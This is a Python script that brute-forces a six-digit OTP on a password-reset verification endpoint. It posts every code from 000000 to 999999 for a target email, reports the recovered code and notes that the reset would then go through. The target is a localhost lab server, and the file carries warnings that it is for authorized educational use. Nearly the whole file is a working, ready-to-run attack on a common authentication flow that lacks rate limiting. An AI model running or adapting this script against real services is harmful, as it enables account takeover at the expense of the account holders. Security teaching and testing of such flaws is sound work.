#!/usr/bin/env python3
"""
OTP Brute-Force Attack Script
Demonstrates brute-forcing a 6-digit OTP with no rate limiting
WARNING: Use only in authorized lab environments!
"""

import requests
import time
from datetime import datetime

# Configuration
TARGET_URL = "http://127.0.0.1:5001/verify-otp"
TARGET_EMAIL = "victim@example.com"
START_OTP = 0
END_OTP = 999999

# Color codes for terminal output
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'
BOLD = '\033[1m'

def brute_force_otp():
    """
    Brute-force 6-digit OTP by trying all combinations from 000000 to 999999
    """
    print(f"{BOLD}{'=' * 70}{RESET}")
    print(f"{BOLD}OTP BRUTE-FORCE ATTACK{RESET}")
    print(f"{'=' * 70}")
    print(f"Target URL: {TARGET_URL}")
    print(f"Target Email: {TARGET_EMAIL}")
    print(f"OTP Range: {START_OTP:06d} - {END_OTP:06d}")
    print(f"Total Attempts: {END_OTP - START_OTP + 1:,}")
    print(f"{'=' * 70}\n")
    
    # Start timing the attack
    start_time = time.time()
    start_datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[*] Attack started at: {start_datetime}")
    print(f"[*] Brute-forcing OTP...\n")
    
    attempts = 0
    success = False
    recovered_otp = None
    
    # Iterate through all possible 6-digit combinations
    for otp_candidate in range(START_OTP, END_OTP + 1):
        attempts += 1
        
        # Format OTP with leading zeros (e.g., 000042)
        otp_str = str(otp_candidate).zfill(6)
        
        # Prepare the POST request payload
        payload = {
            "email": TARGET_EMAIL,
            "otp": otp_str
        }
        
        try:
            # Send POST request to verify OTP
            response = requests.post(
                TARGET_URL,
                json=payload,
                timeout=5
            )
            
            # Show progress every 10,000 attempts
            if attempts % 10000 == 0:
                elapsed = time.time() - start_time
                rate = attempts / elapsed
                print(f"[{attempts:,} attempts] Current OTP: {otp_str} | "
                      f"Rate: {rate:.0f} req/sec | Elapsed: {elapsed:.1f}s")
            
            # Check if OTP was accepted (success response)
            if response.status_code == 200:
                response_data = response.json()
                if response_data.get("success"):
                    success = True
                    recovered_otp = otp_str
                    break
                    
        except requests.exceptions.RequestException as e:
            print(f"{RED}[!] Network error at OTP {otp_str}: {e}{RESET}")
            continue
    
    # Calculate elapsed time
    end_time = time.time()
    elapsed_time = end_time - start_time
    end_datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Display results
    print(f"\n{'=' * 70}")
    if success:
        print(f"{GREEN}{BOLD}[✓] ATTACK SUCCESSFUL!{RESET}")
        print(f"{'=' * 70}")
        print(f"{GREEN}[+] Recovered OTP: {BOLD}{recovered_otp}{RESET}")
        print(f"{GREEN}[+] Total Attempts: {attempts:,}{RESET}")
        print(f"{GREEN}[+] Time Taken: {elapsed_time:.2f} seconds ({elapsed_time/60:.2f} minutes){RESET}")
        print(f"{GREEN}[+] Average Rate: {attempts/elapsed_time:.0f} requests/second{RESET}")
        print(f"{GREEN}[+] Attack finished at: {end_datetime}{RESET}")
        
        # Verify the recovered OTP works
        print(f"\n[*] Verifying recovered OTP...")
        verify_payload = {"email": TARGET_EMAIL, "otp": recovered_otp}
        verify_response = requests.post(TARGET_URL, json=verify_payload)
        
        if verify_response.status_code == 200:
            print(f"{GREEN}[✓] OTP verification successful!{RESET}")
            print(f"{GREEN}[✓] Password reset would now be allowed.{RESET}")
        
    else:
        print(f"{RED}{BOLD}[✗] ATTACK FAILED{RESET}")
        print(f"{'=' * 70}")
        print(f"{RED}[!] No valid OTP found after {attempts:,} attempts{RESET}")
        print(f"{RED}[!] Time taken: {elapsed_time:.2f} seconds{RESET}")
    
    print(f"{'=' * 70}\n")
    
    return success, recovered_otp, attempts, elapsed_time

if __name__ == "__main__":
    print(f"\n{YELLOW}WARNING: This script is for educational purposes only.{RESET}")
    print(f"{YELLOW}Only use in authorized lab environments!{RESET}\n")
    
    input("Press ENTER to start the brute-force attack...")
    
    # Execute the attack
    success, otp, attempts, time_taken = brute_force_otp()
    
    # Summary
    if success:
        print(f"{BOLD}ATTACK SUMMARY:{RESET}")
        print(f"  Recovered OTP: {otp}")
        print(f"  Attempts: {attempts:,}")
        print(f"  Duration: {time_taken:.2f}s")
        print(f"  Attack Rate: {attempts/time_taken:.0f} req/s\n")